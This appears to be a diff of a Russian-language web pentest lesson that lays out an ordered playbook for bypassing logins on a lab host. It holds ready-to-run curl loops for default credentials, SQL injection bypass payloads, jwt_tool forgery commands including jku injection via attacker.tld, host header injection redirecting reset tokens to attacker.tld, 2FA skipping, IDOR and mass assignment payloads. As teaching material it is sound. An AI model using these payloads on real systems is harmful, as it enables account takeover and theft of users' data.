@@ -15,197 +15,179 @@ estimated_minutes: 36
 summary: "Упорядоченное decision-tree от «нашёл форму логина» до доступа: дефолтные креды → SQLi-обход → JWT → сессии → сброс пароля → 2FA → IDOR."
 ---
 
-Форма логина или админ-панель — это точка входа, а не тупик. Вопрос всегда один: **в каком порядке пробовать обход, чтобы не потратить часы на брутфорс, когда рядом лежит дефолтный `admin:admin` или подделываемый JWT.** Этот плейбук задаёт порядок веток: от самых дешёвых (дефолтные креды) к более сложным (JWT-подделка, гонки в сбросе пароля, IDOR).
+## Задача
 
-## Дерево решения (общая карта)
+Ты нашёл на `https://shop.target.local` форму логина. Это точка входа, а не тупик. Вопрос всегда один: **в каком порядке пробовать обход**, чтобы не потратить часы на брутфорс, когда рядом лежит дефолтный `admin:admin` или подделываемый JWT.
+
+Этот плейбук задаёт порядок веток: от самых дешёвых (дефолтные креды) к сложным (JWT-подделка, гонки в сбросе пароля, IDOR).
+
+## Данные, с которыми работаем
+
+Форма `POST /login` (`username`/`password`), cookie с токеном, эндпоинт `/api/orders/{id}`. Пройдём по дереву.
+
+## Дерево решения
 
 ```
 [форма логина / админ-панель / токен]
-   │
-   ├─(1) ДЕФОЛТНЫЕ и ТИПОВЫЕ креды + username enumeration
-   │      │  admin:admin, admin:password, guest, демо-аккаунты
-   │      └─ сработало ──► [доступ] ──► (7) эскалация привилегий
-   │
-   ├─(2) SQLi-ОБХОД логина (' OR 1=1-- -)
-   │      └─ ошибка/обход ──► [доступ] + возможен дамп юзеров
-   │
-   ├─(3) ТОКЕНЫ: JWT / opaque
-   │      ├─ JWT: alg=none, alg-confusion, слабый секрет, jku/jwk
-   │      └─ opaque: фиксация, предсказуемость, отсутствие ротации
-   │
-   ├─(4) СЕССИИ: фиксация, отсутствие logout, cookie без HttpOnly/SameSite
-   │
-   ├─(5) СБРОС ПАРОЛЯ: предсказуемый токен, host header injection, гонка
-   │
-   ├─(6) 2FA: перебор кода, отсутствие лимита, обход «доверенного» потока
-   │
-   └─(7) АВТОРИЗАЦИЯ: IDOR, вертикальная/горизонтальная эскалация, mass assignment
-          │
-          └─► [чужой аккаунт / админка / данные]
+   ├─(1) ДЕФОЛТНЫЕ креды + username enumeration ──► [доступ] → (7)
+   ├─(2) SQLi-ОБХОД логина (' OR 1=1-- -) ─────────► [доступ] → (7)
+   ├─(3) ТОКЕНЫ: JWT (none/confusion/слабый/jku/kid)
+   ├─(4) СЕССИИ: фиксация, logout, cookie-атрибуты
+   ├─(5) СБРОС ПАРОЛЯ: токен, host header, гонка
+   ├─(6) 2FA: лимит попыток, пропуск шага
+   └─(7) АВТОРИЗАЦИЯ: IDOR, privesc, mass assignment ──► [чужой аккаунт]
 ```
 
-## Шаг 1. Дефолтные и типовые креды + enumeration
+## Шаг 1: дефолтные креды и enumeration
 
-Самая дешёвая ветка — начинать всегда с неё. Никогда не начинайте с `rockyou` на живой сервис.
+Самая дешёвая ветка — начинать всегда с неё. **Никогда не начинай с `rockyou`** на живой сервис.
 
 ```bash
-# Дефолтные пары и типовые (маленький курируемый список, НЕ миллион строк)
-for c in admin:admin admin:password admin:admin123 root:root \
-         administrator:administrator guest:guest test:test user:user; do
-  u=${c%%:*}; p=${c##*:}
-  code=$(curl -s -o /dev/null -w '%{http_code}' -u "$u:$p" https://target.tld/admin/)
-  echo "$c -> $code"
-done
+$ for c in admin:admin admin:password root:root guest:guest; do
+    u=${c%%:*}; p=${c##*:}
+    code=$(curl -s -o /dev/null -w '%{http_code}' -u "$u:$p" https://shop.target.local/admin/)
+    echo "$c -> $code"
+  done
+admin:admin -> 401
+admin:password -> 302            # редирект после входа -> успех
 
-# Форма логина: один POST, смотрим на текст ошибки и на редирект
-curl -s -i -c /tmp/cj.txt -d 'username=admin&password=admin' https://target.tld/login | head -20
-
-# Enumeration: разный ответ на существующего/несуществующего пользователя
-curl -s -o /dev/null -w '%{size_download}\n' -d 'username=admin&password=x' https://target.tld/login
-curl -s -o /dev/null -w '%{size_download}\n' -d 'username=nosuchuser_zz&password=x' https://target.tld/login
+# enumeration: разный ответ на существующего/несуществующего пользователя
+$ curl -s -o /dev/null -w '%{size_download}\n' -d 'username=admin&password=x' https://shop.target.local/login
+5211
+$ curl -s -o /dev/null -w '%{size_download}\n' -d 'username=nosuch_zz&password=x' https://shop.target.local/login
+4821
 ```
 
-**Условие ветвления:** есть демо/тестовый аккаунт или дефолт → вошли, идите в шаг 7 (эскалация). Разная реакция на существующего пользователя → у вас валидный список логинов для шага 2/5.
+**Условие ветвления:** есть дефолт/демо-аккаунт → вошли, иди в шаг 7. Разная реакция на существующего пользователя → у тебя валидный список логинов для шага 2/5.
 
-## Шаг 2. SQLi-обход логина
+## Шаг 2: SQLi-обход логина
 
-Если форма конкатенирует SQL, кавычка даст ошибку, а логические тавтологии — обход.
+Если форма конкатенирует SQL, кавычка даст ошибку, а логические тавтологии — обход:
 
 ```bash
-# Типовые обходы (по одному, смотрим на редирект/размер/ошибку)
-for p in "' OR '1'='1'-- -" "admin'-- -" "' OR 1=1 LIMIT 1-- -" \
-         "') OR ('1'='1'-- -" "' OR '1'='1'/*" '" OR "1"="1"-- -'; do
-  echo "== $p"
-  curl -s -o /dev/null -w 'code=%{http_code} size=%{size_download}\n' \
-    --data-urlencode "username=admin" --data-urlencode "password=$p" https://target.tld/login
-done
-
-# Если подозрение на инъекцию — передайте запрос sqlmap
-sqlmap -r login.req --batch --level 3 --risk 2 -p username,password --dbms=mysql
+$ for p in "' OR '1'='1'-- -" "admin'-- -" "') OR ('1'='1'-- -"; do
+    echo "== $p"
+    curl -s -o /dev/null -w 'code=%{http_code} size=%{size_download}\n' \
+      --data-urlencode "username=admin" --data-urlencode "password=$p" https://shop.target.local/login
+  done
+== ' OR '1'='1'-- -   code=302 size=0     # редирект -> обход сработал
 ```
 
-**Условие ветвления:** обход сработал → вы в приложении под первым пользователем из запроса; далее дамп юзеров и шаг 7. Не сработал, но ошибки SQL видны → это всё ещё SQLi-точка, идите в `web-playbook-injection-triage`.
+**Условие ветвления:** обход сработал → ты в приложении под первым пользователем из запроса; далее дамп юзеров и шаг 7. Не сработал, но ошибки SQL видны → это всё ещё SQLi-точка, иди в `web-playbook-injection-triage`.
 
-## Шаг 3. Токены: JWT и opaque
-
-Токен в cookie/заголовке — второй по частоте путь. Для JWT есть отдельный урок `web-tool-jwt-tools`; здесь — порядок проверок.
+## Шаг 3: токены — JWT и opaque
 
 ```bash
-# Декодировать JWT (header.payload.signature)
-jwt_tool eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjF9.XXXX
+$ jwt_tool eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjF9.XXXX
 
-# 1) alg=none
-jwt_tool <token> -X a            # попробовать none-алгоритм
-
-# 2) alg-confusion (RS256 -> HS256 с публичным ключом как секретом)
-jwt_tool <token> -X k -pk pub.pem
-
-# 3) слабый HMAC-секрет (офлайн, по словарю)
-jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt
-hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
-
-# 4) jku/jwk injection: подсунуть свой ключ
-jwt_tool <token> -X s -ju https://attacker.tld/jwks.json
+$ jwt_tool $TOKEN -X a                          # alg:none
+$ jwt_tool $TOKEN -X k -pk pub.pem              # RS256 -> HS256 confusion
+$ jwt_tool $TOKEN -C -d jwt-secrets.txt         # слабый HMAC (офлайн)
+$ jwt_tool $TOKEN -X s -ju https://attacker.tld/jwks.json   # jku injection
 ```
 
-**Условие ветвления:** подделали токен (none/слабый секрет/подмена ключа) → установите его и смените claim (`uid`, `role`, `sub`) на жертву/админа → шаг 7. Не подделали → проверьте, не проверяется ли подпись вообще (поменяйте байт в payload и посмотрите, примут ли).
+**Условие ветвления:** подделал токен → установи его, смени claim (`uid`/`role`/`sub`) на жертву/админа → шаг 7. Не подделал → проверь, не проверяется ли подпись вообще (поменяй байт в payload).
 
-## Шаг 4. Сессии: фиксация и слабые cookie
+## Шаг 4: сессии — фиксация и слабые cookie
 
 ```bash
-# Атрибуты cookie
-curl -sI https://target.tld/login | grep -i set-cookie
-#   ищем: HttpOnly, Secure, SameSite, длину и «случайность» значения
+$ curl -sI https://shop.target.local/login | grep -i set-cookie
+Set-Cookie: session=abc123; Path=/          # нет HttpOnly/SameSite/Secure
 
-# Фиксация сессии: до логина и после — тот же ID?
-curl -s -c /tmp/pre.txt https://target.tld/ -o /dev/null
-curl -s -b /tmp/pre.txt -c /tmp/post.txt -d 'username=u&password=p' https://target.tld/login -o /dev/null
-diff <(cut -f6,7 /tmp/pre.txt) <(cut -f6,7 /tmp/post.txt)
-
-# Проверка «logout»: инвалидируется ли серверная сессия
-curl -s -b "session=$S" https://target.tld/logout -o /dev/null
-curl -s -b "session=$S" https://target.tld/account -o /dev/null -w 'after-logout=%{http_code}\n'
+# фиксация: до логина и после — тот же ID?
+$ curl -s -c pre.txt https://shop.target.local/ -o /dev/null
+$ curl -s -b pre.txt -c post.txt -d 'username=u&password=p' https://shop.target.local/login -o /dev/null
+$ diff <(cut -f6,7 pre.txt) <(cut -f6,7 post.txt)
 ```
 
-**Условие ветвления:** ID сессии не меняется после логина (фиксация) → можно подготовить сессию для жертвы. Cookie без `HttpOnly` → возможен угон через XSS (`web-xss`). «Logout» не инвалидирует → украденная сессия живёт вечно.
+**Условие ветвления:** ID не меняется после логина (фиксация) → можно подготовить сессию для жертвы. Cookie без `HttpOnly` → угон через XSS. «Logout» не инвалидирует → украденная сессия живёт вечно.
 
-## Шаг 5. Сброс пароля
-
-Часто самый слабый канал: токен предсказуем, письмо уходит на подконтрольный хост, либо токен не привязан к пользователю.
+## Шаг 5: сброс пароля
 
 ```bash
-# 1) Запрос сброса и анализ письма/ответа
-curl -s -i -d 'email=victim@target.tld' https://target.tld/forgot | head -30
+$ curl -s -i -d 'email=victim@shop.target.local' -H 'Host: attacker.tld' \
+    https://shop.target.local/forgot | grep -i 'location\|reset\|token'
+Location: https://attacker.tld/reset?token=abc123    # host header injection!
 
-# 2) Host header injection: уйдёт ли ссылка на ваш хост
-curl -s -i -d 'email=victim@target.tld' -H 'Host: attacker.tld' \
-  https://target.tld/forgot | grep -i 'location\|reset\|token'
-
-# 3) Предсказуемость токена: два сброса подряд, сравнить токены
-curl -s -d 'email=a@target.tld' https://target.tld/forgot
-curl -s -d 'email=a@target.tld' https://target.tld/forgot
-#   анализируем: инкремент, timestamp, base64 от email, короткий hex
-
-# 4) Гонка: отправить два запроса сброса параллельно на один аккаунт
-for i in 1 2; do curl -s -d 'email=victim@target.tld' https://target.tld/forgot & done; wait
+# предсказуемость токена: два сброса подряд
+$ curl -s -d 'email=a@shop.target.local' https://shop.target.local/forgot
+$ curl -s -d 'email=a@shop.target.local' https://shop.target.local/forgot
 ```
 
-**Условие ветвления:** токен предсказуем или ушёл на ваш host → перехватываете сброс → задаёте свой пароль → вход под жертвой. Не вышло → проверьте, можно ли задать `email`/`user_id` другого пользователя напрямую (IDOR в сбросе).
+**Условие ветвления:** токен предсказуем или ушёл на твой host → перехватываешь сброс → задаёшь свой пароль → вход под жертвой. Не вышло → проверь IDOR в сбросе (`user_id` другого пользователя).
 
-## Шаг 6. 2FA
+## Шаг 6: 2FA
 
 ```bash
-# Нет лимита попыток? (осторожно: НЕ брутить 000000-999999 — это lockout/DoS)
-for code in 000000 111111 123456 000001 100000; do
-  curl -s -o /dev/null -w "$code -> %{http_code}\n" \
-    -b "session=$S" -d "otp=$code" https://target.tld/2fa/verify
-done
+# нет лимита попыток? (НЕ брутить 000000-999999 — это lockout/DoS)
+$ for code in 000000 111111 123456; do
+    curl -s -o /dev/null -w "$code -> %{http_code}\n" \
+      -b "session=$S" -d "otp=$code" https://shop.target.local/2fa/verify
+  done
 
-# Обход: пропуск шага 2FA прямым переходом на внутреннюю страницу
-curl -s -b "session=$S" https://target.tld/dashboard -o /dev/null -w '%{http_code}\n'
-
-# Обход: ответ на 2FA принимается по одному и тому же сессионному ключу? (проверка привязки)
+# обход: пропуск шага 2FA прямым переходом
+$ curl -s -b "session=$S" https://shop.target.local/dashboard -o /dev/null -w '%{http_code}\n'
+200                              # внутренняя страница без 2FA -> проверка не на сервере
 ```
 
-**Условие ветвления:** внутренние страницы открываются без 2FA → проверка не на сервере, обход тривиален. Нет лимита попыток → сообщите как отдельную находку (rate-limit), но **не** перебирайте миллион вариантов на живой цели.
-
-## Шаг 7. Авторизация: IDOR и эскалация
-
-Аутентификация пройдена — начинается самое частое: **приложение не проверяет, что объект принадлежит вам**.
+## Шаг 7: авторизация — IDOR и эскалация
 
 ```bash
-# Горизонтальный IDOR: сменить id на чужой
-curl -s -b "session=$S" https://target.tld/api/orders/1001 | jq .
-curl -s -b "session=$S" https://target.tld/api/orders/1002 | jq .     # чужой заказ?
+$ curl -s -b "session=$S" https://shop.target.local/api/orders/1001 | jq .user_id
+1001
+$ curl -s -b "session=$S" https://shop.target.local/api/orders/1002 | jq .user_id
+1002                             # чужой заказ -> IDOR
 
-# Вертикальный: достучаться до админского API обычным токеном
-curl -s -b "session=$S" https://target.tld/api/admin/users -o /dev/null -w '%{http_code}\n'
-
-# Mass assignment: добавить лишнее поле
-curl -s -b "session=$S" -H 'Content-Type: application/json' \
-  -d '{"name":"me","role":"admin","isAdmin":true}' https://target.tld/api/me | jq .
+# mass assignment
+$ curl -s -b "session=$S" -H 'Content-Type: application/json' \
+    -d '{"name":"me","role":"admin","isAdmin":true}' https://shop.target.local/api/me | jq .
 ```
 
-**Условие ветвления:** получили чужой объект или админ-функцию → подтверждённый IDOR/privesc, фиксируйте доказательство (чужой `user_id` в ответе). Только `403` → вернитесь на шаг 3/4, возможно нужен другой токен/роль.
+**Условие ветвления:** получил чужой объект или админ-функцию → подтверждённый IDOR/privesc, фиксируй доказательство. Только `403` → вернись на шаг 3/4.
+
+## Полный прогон от начала до конца
+
+1. Дефолтные креды → `admin:password` дал `302`.
+2. Внутри — `GET /api/orders/1001` → свой заказ.
+3. Смена на `1002` → чужой заказ (`user_id:1002`) → IDOR.
+4. Проверка вертикали: `/api/admin/users` обычным токеном → `403` (нужен другой токен).
+5. Артефакт: чужие данные в ответе.
 
 ## Если не сработало — пробуй это
 
-- **Всё возвращает 200, но это страница логина.** Проверяйте не код, а наличие чувствительного контента (`jq .id`, grep по имени пользователя).
-- **Брутфорс даёт только «слишком много попыток».** Это и есть находка (нет нормального lockout/rate-limit). Не долбите дальше — переходите на другие ветки.
-- **JWT не подделывается.** Проверьте `kid` (path traversal/SQLi в kid), `jku`/`x5u` (загрузка вашего ключа), отсутствие проверки `aud`/`iss`.
-- **OAuth/OIDC вместо пароля.** Смотрите `web-oauth-oidc-saml`, `web-sso-mixup`, `web-oauth-device-code` — там `redirect_uri` и mix-up.
-- **Есть регистрация.** Пробуйте занять `admin`/`support`, дубликаты email с разным регистром/Unicode, self-XSS в профиле, приглашения в организацию.
-- **Пароль в ответе API.** Иногда `GET /api/me` возвращает `password_hash` или `api_key` — ищите такие утечки.
+- **Всё 200, но это страница логина.** Проверяй не код, а наличие чувствительного контента (`jq .id`, grep по имени).
+- **Брутфорс даёт «too many attempts».** Это и есть находка (нет rate-limit). Не долби дальше.
+- **JWT не подделывается.** Проверь `kid` (path traversal/SQLi), `jku`/`x5u`, отсутствие проверки `aud`/`iss`.
+- **OAuth/OIDC вместо пароля.** Смотри `web-oauth-oidc-saml`, `web-sso-mixup` — там `redirect_uri` и mix-up.
+- **Есть регистрация.** Пробуй занять `admin`, дубликаты email, приглашения в организацию.
 
-## Тупики (dead ends)
+## Тупики
 
-- Онлайн-брутфорс большого словаря по сети — дорого, шумно, часто с локом. Только маленький курируемый набор + офлайн-крекинг хешей.
-- Пытаться подделать **opaque**-токен без понимания формата — сначала соберите несколько и сравните.
-- Игнорировать rate-limit как находку — отсутствие лимита само по себе уязвимость.
-- Ковырять фронтенд-валидацию (`disabled`, JS-проверки) вместо сервера — обход делается серверным запросом.
-- Трактовать `200 OK` как «доступ есть» без проверки, что вернулись чужие данные.
+- Онлайн-брутфорс большого словаря — дорого, шумно, часто с локом. Только маленький набор + офлайн-крекинг.
+- Подделывать **opaque**-токен без понимания формата — сначала собери несколько и сравни.
+- Игнорировать rate-limit как находку — отсутствие лимита само уязвимость.
+- Ковырять фронтенд-валидацию вместо сервера — обход делается серверным запросом.
+- Трактовать `200 OK` как доступ без проверки, что вернулись чужие данные.
+
+## Что мы теперь знаем
+
+- Порядок веток: дефолты → SQLi-обход → токены → сессии → сброс → 2FA → авторизация.
+- Дешёвые ветки (дефолтные креды) идут раньше дорогого брутфорса.
+- JWT ломается предсказуемо: none/confusion/слабый секрет/jku/kid.
+- Host header injection в сбросе уводит токен на чужой хост.
+- IDOR подтверждается **чужими** данными, а не кодом 200.
+
+## На что смотреть дальше
+
+- **Онлайн-брутфорс — EV-минус.** Только дефолты и топ-100, офлайн — hashcat.
+- **Rate-limit как находка.** Отсутствие лимита — отдельная уязвимость.
+- **Opaque-токены.** Сравнивай несколько значений на предсказуемость.
+- **Вертикаль vs горизонталь.** IDOR — горизонталь; доступ к админ-API — вертикаль.
+- **Стабилизация.** Полученный доступ — точка входа дальше, не финал.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "С чего начинать при находке панели логина?"
@@ -249,6 +231,10 @@ curl -s -b "session=$S" -H 'Content-Type: application/json' \
   answer: 1
   explanation: "Host header injection уводит ссылку с токеном сброса на чужой домен."
 ```
+
+## Куда дальше
+
+Дальше (`web-playbook-file-to-rce`) мы разберём путь от файлового примитива (upload/LFI/traversal) до исполнения кода. А пока главное запомни: порядок веток экономит часы — дефолтные креды проверяются до единого брутфорса.
 
 ## Где пригодится
 
